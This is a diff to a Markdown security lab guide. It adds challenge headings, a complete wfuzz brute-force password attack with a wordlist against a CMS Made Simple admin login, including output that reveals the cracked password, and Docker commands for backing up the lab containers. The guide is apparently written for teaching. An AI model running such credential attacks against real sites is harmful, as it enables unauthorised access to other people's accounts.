@@ -219,6 +219,8 @@ Finish the installation guide and click CMSMS admin panel. **Login as admin and 
 <img src="images/cms-install2.png" width="900" height="900">
 
 ## Wpscan and the WordPress site
+### Challenge 4: Scan WordPress with wpscan
+
 This section uses wpscan to:
 1. Scan the WordPress site for vulnerabilities.
 2. Enumerate WordPress users.
@@ -363,6 +365,8 @@ Trying admin / marlon Time: 00:00:55 <                                          
 **Capture a screenshot of the successful wpscan password attack.**
 
 ## Wfuzz password attack
+### Challenge 5: CMS Made Simple 2.2.5 password attack with wfuzz
+
 We need to collect some information before starting the password attack against CMS Made Simple 2.2.5. By default, wfuzz will show results from every request. The volume of feedback makes it more difficult to detect the successful result in a password attack. However, wfuzz also supports suppressing results based on text strings or http response codes. To set the criteria to show or hide select results, we need to understand how the application responds to failed login attempts and successful login attempts. 
 
 The next screenshot shows a failed login attempt. Note the page includes the string "User name or password incorrect". The fact that the message does not disclose whether the it is the user name or password that failed is a good security practice that will help defend against user enumeration (identifying valid users). However, we can also use this string, or even just part of this string (i.e., "incorrect") as a text string to suppress invalid results in a password attack. 
@@ -382,3 +386,57 @@ username=admin&password=vanilla&loginsubmit=Submit
 Now, compare the response to a successful login attempt. **The successful login attempt gave an http response code 302**. 
 
 <img src="images/cms-successful-l0gin-burp.png" width="900" height="900">
+
+We have the information needed to launch a wfuzz password attack. Those details are:
+1. Hide results with text string "incorrect" or http response code 200, or show results with http response code 302.
+2. The POST request parameters are **username=admin&password=vanilla&loginsubmit=Submit**, and the parameter that will be _fuzzed_ is **password=**.
+3. The wordlist for the attack is /usr/share/wordlists/rockyou.txt.
+
+The following command suppresses results with text string "incorrect" and _fuzzes_ the password parameter.
+```
+wfuzz -w /usr/share/wordlists/rockyou.txt -d "username=admin&password=FUZZ&loginsubmit=Submit" --hs "incorrect" http://104.198.70.155:10000/cms/admin/login.php
+
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://104.198.70.155:10000/cms/admin/login.php
+Total requests: 14344392
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                            
+=====================================================================
+
+000001433:   302        0 L      0 W        0 Ch        "marlboro"                                                                         
+
+Total time: 55.95364
+Processed Requests: 1856
+Filtered Requests: 1855
+Requests/sec.: 33.17031
+```
+**Execute a wfuzz password attack against CMS Made Simple 2.2.5 and capture a screenshot of the successful password attack**.
+
+## Backup a Docker container
+Let's backup the docker containers used in this lab so that we can easily redeploy the built images if we happen to break either web application.
+
+### Challenge 6, Extra-Mile: Create local image from running Docker containers
+
+Our lab was built from two images downloaded from hub.docker.com. The WordPress image came from vulhub/wordpress:4.6 and the MySQL image came from mysql:5. However, made changes to both images. If we were to break either the web server or database server, we might have to rebuild both servers from the default images. That takes time. Alternatively, we could create local images from the running containers, and if needed, rebuild the lab from those local images. Rebuilding the lab from the local images would take seconds or minutes versus an hour or so to rebuild the labs from the Docker hub images.
+
+The following commands _commit_ the running containers to local images. We can commit a running container from either the container ID or container name. This example uses the container names. The command **sudo docker images** shows locally stored images, included the newly created images from the running containers.
+
+```
+sudo docker commit wordpress wp_backup:latest
+sha256:7c09a91052a836136be08fc9b2315f435b747de5552a20767b3bb24fe4867992
+
+sudo docker commit mysql mysql_backup:latest
+sha256:513fc3feb19a46a048ff1f64712e8953ecac1f19337dfb862dab858053154bbe
+
+sudo docker images
+REPOSITORY               TAG             IMAGE ID       CREATED              SIZE
+mysql_backup             latest          513fc3feb19a   21 seconds ago       430MB
+wp_backup                latest          7c09a91052a8   About a minute ago   409MB
+```
+
+**Capture a screenshot showing the backup images for the wordpress and mysql containers.**
